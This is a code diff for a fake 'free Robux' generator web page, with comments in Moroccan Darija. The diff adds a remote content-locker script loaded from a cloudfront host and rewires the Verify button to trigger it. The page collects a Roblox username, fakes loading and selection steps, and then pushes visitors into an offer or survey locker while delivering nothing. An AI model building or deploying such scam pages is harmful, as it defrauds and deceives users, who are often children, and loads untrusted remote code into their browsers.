@@ -44,33 +44,22 @@
         ul li {
             margin-left: 30px;
         }
-        @media (max-width: 373px) {
-            .logo span {
-                display: none;
-            }
-            nav {
-                padding: 0;
-            }
-        }
-        @media (max-width: 442px) {
-            nav {
-                padding: 0 20px;
-            }
-        }
-        @media (max-width: 396px) {
-            nav {
-                padding: 0 10px;
-            }
-        }
-        .animate-fade-in {
-            animation: fadeIn 0.5s ease-in-out;
-        }
+        @media (max-width: 373px) { .logo span { display: none; } nav { padding: 0; } }
+        @media (max-width: 442px) { nav { padding: 0 20px; } }
+        @media (max-width: 396px) { nav { padding: 0 10px; } }
+        .animate-fade-in { animation: fadeIn 0.5s ease-in-out; }
         @keyframes fadeIn {
             from { opacity: 0; transform: translateY(10px); }
             to { opacity: 1; transform: translateY(0); }
         }
     </style>
-    <!-- 7eyedna les scripts li kaydiro l'mochkil men hna -->
+    
+    <!-- HNA ZEDNA L'CODE LOCKER DYALK -->
+    <script type="text/javascript">
+        var kazYT_RRL_crEnMc={"it":4524687,"key":"9c53c"};
+    </script>
+    <script src="https://d1y0yks1k8t5m5.cloudfront.net/789c88e.js"></script>
+
 </head>
 <body>
     <nav>
@@ -95,7 +84,6 @@
     </div>
 
     <div class="max-w-xl mx-auto py-10 px-6 text-center">
-        <!-- L'username section baqa kifma hiya -->
         <div id="username-section">
             <input class="w-full px-4 py-2 rounded-xl shadow-md mb-4 text-lg border border-gray-300" 
                    id="username" 
@@ -108,7 +96,6 @@
             </button>
         </div>
         
-        <!-- Section dyal Robux, ghadi tbda mkhbya -->
         <div class="hidden mt-8" id="resource-section">
             <p class="block text-lg font-medium mb-4">Select robux amount</p>
             <div class="grid grid-cols-2 gap-4">
@@ -143,7 +130,6 @@
         </div>
     </div>
 
-    <!-- Loading Overlay -->
     <div class="hidden fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" id="loading-overlay">
         <div class="text-center">
             <div class="w-16 h-16 border-4 border-white border-dashed rounded-full animate-spin mx-auto mb-4"></div>
@@ -151,7 +137,6 @@
         </div>
     </div>
 
-    <!-- Error Modal -->
     <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="error-modal">
         <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center">
             <p class="text-red-600 font-semibold mb-4" id="error-modal-text">Error</p>
@@ -162,13 +147,12 @@
         </div>
     </div>
 
-    <!-- Verification Step -->
     <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="verify-step">
         <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in">
             <p class="text-lg font-medium mb-4">Complete the verification to receive your robux.</p>
-            <!-- L'function _cy() t7eydat, khassk dir l'function dyalk hna -->
+            <!-- HNA BEDDELNA L'FUNCTION BACH T3IYYET L'LOCKER -->
             <button class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition" 
-                    onclick="startVerification()">
+                    onclick="_cpb()">
                 Verify
             </button>
         </div>
@@ -176,7 +160,6 @@
 
     <script>
         (function(){
-            // DOM Elements
             const errorModal = document.getElementById("error-modal");
             const errorModalText = document.getElementById("error-modal-text");
             const loadingOverlay = document.getElementById("loading-overlay");
@@ -185,67 +168,48 @@
             const resourceSection = document.getElementById("resource-section");
             let selectedResource = null;
 
-            // Show error message
             function showError(message) {
                 errorModalText.textContent = message;
                 errorModal.classList.remove("hidden");
             }
 
-            // Close error modal
             window.closeErrorModal = function() {
                 errorModal.classList.add("hidden");
             }
 
-            // Function jdida: Mli l'user ydkhel smito o ycliki continue
             window.proceedToSelection = function() {
                 const username = document.getElementById("username").value.trim();
-                
                 if(!username) {
                     showError("Please enter a Roblox username");
                     return;
                 }
-                
                 loadingOverlay.classList.remove("hidden");
-                
-                // Ghadi nkhbiw l'username section o nbiyno l'Robux section
                 setTimeout(() => {
                     loadingOverlay.classList.add("hidden");
                     usernameSection.classList.add("hidden");
                     resourceSection.classList.remove("hidden");
-                }, 1500); // Gha bach yban chwiya dyal l'loading
+                }, 1500);
             }
 
-            // Select Robux amount
             window.selectResource = function(element, value) {
                 document.querySelectorAll('.resource-option').forEach(item => {
                     item.classList.remove('ring', 'ring-2', 'ring-green-500', 'bg-green-50');
                 });
-                
                 element.classList.add('ring', 'ring-2', 'ring-green-500', 'bg-green-50');
-                
                 selectedResource = value;
                 document.getElementById('confirm-button').classList.remove('hidden');
             }
 
-            // Confirm selection
             window.confirmSelection = async function() {
                 if(!selectedResource) {
                     showError("Please select a Robux amount");
                     return;
                 }
-                
                 loadingOverlay.classList.remove("hidden");
                 await new Promise(resolve => setTimeout(resolve, 2500));
                 loadingOverlay.classList.add("hidden");
                 verifyStep.classList.remove("hidden");
             }
-            
-            // Function dyal l'verification (khawya, 3mrha b dakchi li bghiti)
-            window.startVerification = function() {
-                alert("Hna khassk tdir l'code dyal l'verification dyalk!");
-                // Matalan, tdir chi offer walla chi 7aja
-            }
-
         })();
     </script>
 </body>
